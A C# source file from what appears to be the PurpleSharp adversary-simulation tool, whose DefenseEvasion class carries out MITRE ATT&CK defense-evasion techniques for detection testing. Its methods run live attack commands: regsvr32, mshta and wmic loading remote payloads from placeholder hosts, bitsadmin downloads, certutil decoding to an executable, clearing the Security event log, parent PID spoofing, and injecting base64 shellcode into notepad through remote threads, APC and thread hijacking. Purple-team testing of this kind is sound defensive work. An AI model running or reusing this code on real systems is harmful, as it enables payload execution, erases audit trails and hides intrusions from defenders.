using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PurpleSharp.Lib;
using System.IO;
using System.Threading;

namespace PurpleSharp.Simulations
{
    public class DefenseEvasion
    {

        public static void Csmtp(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.003");
            try
            {
                string file = @"C:\Users\Administrator\AppData\Local\Temp\XKNqbpzl.txt";
                ExecutionHelper.StartProcessApi("", String.Format("cmstp /s /ns {0}", file), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        static public void Regsvr32(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.010");
            try
            {
                string url = @"http://malicious.domain:8080/payload.sct";
                string dll = "scrobj.dll";
                ExecutionHelper.StartProcessApi("", String.Format("regsvr32.exe /u /n /s /i:{0} {1}", url, dll), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void InstallUtil(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.004");
            try
            {
                string file = @"C:\Windows\Temp\XKNqbpzl.exe";
                ExecutionHelper.StartProcessApi("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfiles /LogToConsole=alse /U {0}", file), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void RegsvcsRegasm(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1218.009");
            try
            {
                string file = @"winword.dll";
                ExecutionHelper.StartProcessApi("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U {0}", file), logger);
                ExecutionHelper.StartProcessApi("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U {0}", file), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void BitsJobs(PlaybookTask playbook_task, string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1197");
            try
            {
                string file = @"C:\Windows\Temp\winword.exe";
                ExecutionHelper.StartProcessApi("", String.Format("bitsadmin /transfer job /download /priority high {0} {1}", playbook_task.url, file), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void Mshta(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1218.005");
            try
            {
                string url = "http://webserver/payload.hta";
                ExecutionHelper.StartProcessApi("", String.Format("mshta {0}", url), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void DeobfuscateDecode(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1140");
            try
            {
                string encoded = "encodedb64.txt";
                string decoded = "decoded.exe";
                ExecutionHelper.StartProcessApi("", String.Format("certutil -decode {0} {1}", encoded, decoded), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void XlScriptProcessing(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1220");
            try
            {
                string url = "http://webserver/payload.xsl";
                ExecutionHelper.StartProcessApi("", String.Format("wmic os get /FORMAT:\"{0}\"", url), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void Rundll32(PlaybookTask playbook_task, string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1218.011");
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format("rundll32 \"{0}\", {1}", playbook_task.dllPath, playbook_task.exportName), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void ClearSecurityEventLogCmd(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1070.001");
            logger.TimestampInfo("Using the command line to execute the technique");
            try
            {
                ExecutionHelper.StartProcessApi("", "wevtutil.exe cl Security", logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void ClearSecurityEventLogNET(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1070.001");
            logger.TimestampInfo("Using the System.Diagnostics .NET namespace to execute the technique");

            try
            {
                EventLog eventlog = new EventLog();
                eventlog.Source = "Security";
                eventlog.Clear();
                eventlog.Close();
                logger.TimestampInfo(String.Format("Cleared the Security EventLog using .NETs EventLog"));
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                //logger.TimestampInfo(String.Format("Failed to clear the Security EventLog"));
                logger.SimulationFailed(ex);
            }

        }

        public static void PortableExecutableInjection(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1055.002");
            try
            {

                Process proc = new Process();
                proc.StartInfo.FileName = "C:\\Windows\\system32\\notepad.exe";
                proc.StartInfo.UseShellExecute = false;
                proc.Start();
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} started for the injection", proc.ProcessName, proc.Id));
                Thread.Sleep(1000);
                DefenseEvasionHelper.ProcInjection_CreateRemoteThread(Convert.FromBase64String(Lib.Static.donut_ping), proc, logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
            
        }

        public static void AsynchronousProcedureCall(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1055.004");

            try
            {

                Process proc = new Process();
                proc.StartInfo.FileName = "C:\\Windows\\system32\\notepad.exe";
                proc.StartInfo.UseShellExecute = false;
                proc.Start();
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} started for the injection", proc.ProcessName, proc.Id));
                Thread.Sleep(1000);
                DefenseEvasionHelper.ProcInjection_APC(Convert.FromBase64String(Lib.Static.donut_ping), proc, logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void ThreadHijack(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1055.003");
            try 
            {
                Process proc = new Process();
                proc.StartInfo.FileName = "C:\\Windows\\system32\\notepad.exe";
                proc.StartInfo.UseShellExecute = false;
                proc.Start();
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} started for the injection", proc.ProcessName, proc.Id));
                Thread.Sleep(1000);
                DefenseEvasionHelper.ProcInjection_ThreadHijack(Convert.FromBase64String(Lib.Static.donut_ping), proc, logger);
                logger.SimulationFinished();

            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void ParentPidSpoofing(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1134.004");
            try
            {
                Process explorer = Process.GetProcessesByName("explorer").FirstOrDefault();
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} will be used as a parent for the new process", explorer.ProcessName, explorer.Id));
                logger.TimestampInfo(String.Format("Spawning notepad.exe as a child process of {0}",explorer.Id));
                Thread.Sleep(1000);
                Launcher.SpoofParent(explorer.Id, "C:\\WINDOWS\\System32\\notepad.exe", "notepad.exe");
                logger.SimulationFinished();

            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

    }
}
